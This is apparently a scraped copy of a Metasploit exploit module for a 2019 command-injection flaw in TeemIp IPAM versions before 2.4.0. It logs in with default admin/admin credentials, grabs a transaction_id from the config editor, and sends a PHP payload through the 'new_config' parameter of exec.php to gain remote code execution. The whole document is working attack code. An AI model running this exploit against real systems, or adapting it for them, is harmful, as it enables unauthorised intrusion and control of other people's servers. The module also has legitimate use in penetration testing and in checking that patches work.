# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = NormalRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info = {})
    super(update_info(info,
      &#039;Name&#039; => "TeemIp IPAM < 2.4.0 - &#039;new_config&#039; Command Injection",
      &#039;Description&#039; => %q(
        This module exploits a command injection vulnerability in TeemIp
        versions prior to 2.4.0. The "new_config" parameter of "exec.php" 
        allows you to create a new PHP file with the exception of config information.

        The malicious PHP code sent is executed instantaneously and is not saved on the server.
        The vulnerability can be exploited by an authorized user (Administrator).
        Module allows remote command execution by sending php payload with parameter &#039;new_config&#039;.

      ),
      &#039;License&#039; => MSF_LICENSE,
      &#039;Author&#039; =>
        [
          &#039;AkkuS <Özkan Mustafa Akkuş>&#039;, # Discovery & PoC & Metasploit module
        ],
      &#039;References&#039; =>
        [
          [&#039;URL&#039;, &#039;http://pentest.com.tr/exploits/TeemIp-IPAM-2-4-0-new-config-Command-Injection-Metasploit.html&#039;]
        ],
      &#039;Platform&#039; => &#039;php&#039;,
      &#039;Arch&#039; => ARCH_PHP,
      &#039;Targets&#039; => [[&#039;Automatic&#039;, {}]],
      &#039;Privileged&#039; => false,
      &#039;DisclosureDate&#039; => "Apr 03 2019",
      &#039;DefaultTarget&#039; => 0))

    register_options(
      [
        OptString.new(&#039;TARGETURI&#039;, [true, "Base TeemIp IPAM directory path", &#039;/6&#039;]),
        OptString.new(&#039;USERNAME&#039;, [true, "Username to authenticate with", &#039;admin&#039;]),
        OptString.new(&#039;PASSWORD&#039;, [false, "Password to authenticate with", &#039;admin&#039;])
      ]
    )
  end
##
# Login and cookie information gathering
##
  def do_login

    res = send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;pages&#039;, &#039;UI.php&#039;),
      &#039;vars_post&#039; => {
        &#039;auth_user&#039; => datastore[&#039;username&#039;],
        &#039;auth_pwd&#039; => datastore[&#039;password&#039;],
        &#039;loginop&#039; => &#039;login&#039;
      }
    )

    unless res
      fail_with(Failure::Unreachable, &#039;Connection error occurred!&#039;)
    end

    if res.code == 200 && (res.body =~ /Logged in as/)
      print_good("Authentication was successful")
      @cookies = res.get_cookies
      return 
    else
      fail_with(Failure::NoAccess, &#039;Authentication was unsuccessful&#039;)     
    end  
  end

  def peer
    "#{ssl ? &#039;https://&#039; : &#039;http://&#039; }#{rhost}:#{rport}"
  end
##
##
  def exploit
    unless Exploit::CheckCode::Appears == check
      fail_with(Failure::NotVulnerable, &#039;Target is not vulnerable.&#039;)
    end

    @cookies = nil
    do_login

    res = send_request_cgi(
      &#039;method&#039; => &#039;GET&#039;,
      &#039;uri&#039; => normalize_uri(target_uri, &#039;pages&#039;, &#039;exec.php?exec_module=itop-config&exec_page=config.php&exec_env=production&c%5Bmenu%5D=ConfigEditor&#039;),
      &#039;headers&#039; => {
        &#039;Cookie&#039; => @cookies
      }
    )

    if res and res.code == 200 and res.body =~ /Identify yourself/
      return do_login
    else 
      transid = res.body.split(&#039;transaction_id" value="&#039;)[1].split(&#039;"&#039;)[0]
      print_good("transaction_id : #{transid}")
    end

    res = send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri, &#039;pages&#039;, &#039;exec.php?exec_module=itop-config&exec_page=config.php&exec_env=production&c%5Bmenu%5D=ConfigEditor&#039;),
      &#039;vars_post&#039; => {
          "operation" => "save",
          "transaction_id" => transid,
          "new_config" => payload.encoded
       },
      &#039;headers&#039; => {
        &#039;Cookie&#039; => @cookies
      }
    )
    handler

  end
##
# Version and Vulnerability Check
##
  def check

    res = send_request_cgi(
      &#039;method&#039; => &#039;POST&#039;,
      &#039;uri&#039; => normalize_uri(target_uri.path, &#039;pages&#039;, &#039;ajax.render.php&#039;),
      &#039;vars_post&#039; => {
          "operation" => "about_box"
      }
    )

    unless res
      vprint_error &#039;Connection failed&#039;
      return CheckCode::Unknown
    end

    if res.code == 200
      version = res.body.split(&#039;iTop version &#039;)[1].split(&#039;" src=&#039;)[0]
      if version < &#039;2.4.1&#039;
       print_status("#{peer} - Teemip Version is #{version}")
       return Exploit::CheckCode::Appears
      end
    end

    return Exploit::CheckCode::Safe
  end
##
# End
##
end

